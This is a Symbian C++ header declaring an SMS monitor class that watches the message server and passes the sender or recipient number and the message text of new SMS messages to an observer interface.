/*
 ============================================================================
 Name		: SmsMonitor.h
 Author	  : 
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CSmsMonitor declaration
 ============================================================================
 */

#ifndef SMSMTMMONITOR_H
#define SMSMTMMONITOR_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <MSVAPI.H>
#include <smsclnt.H>
#include <mtclreg.H>

#include <FuzzyByte\FileLogger.h>

// CLASS DECLARATION

class MSmsMtmObserver
	{
public:
	virtual void HandleNewMtmSmsL(const TDesC& aNumber, const TDesC& aText, TBool isIncoming) = 0;
	};

/**
 *  CSmsMtmMonitor
 * 
 */
class CSmsMtmMonitor : public CBase, MMsvSessionObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CSmsMtmMonitor();

	/**
	 * Two-phased constructor.
	 */
	static CSmsMtmMonitor* NewL(MSmsMtmObserver& aObs);

	/**
	 * Two-phased constructor.
	 */
	static CSmsMtmMonitor* NewLC(MSmsMtmObserver& aObs);

private:
	void HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3);

private:
	HBufC* GetFromToAndBodyL(TMsvId aId, TDes& aFromTo, TBool readFrom);

	/**
	 * Constructor for performing 1st stage construction
	 */
	CSmsMtmMonitor(MSmsMtmObserver& aObs);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();

private:
	TUint							iOldSendState;
	TInt							iOldSentItemInUseValue;
	TMsvId							iInboxMsgId;
	MSmsMtmObserver&				iObserver;
    CSmsClientMtm*                  iSmsMtm;
    CMsvSession*                    iMsvSession;
    CClientMtmRegistry*             iClientMtmReg;
	__LOG_DECLARATION_MEMBER
	};

#endif // SMSMONITOR_H
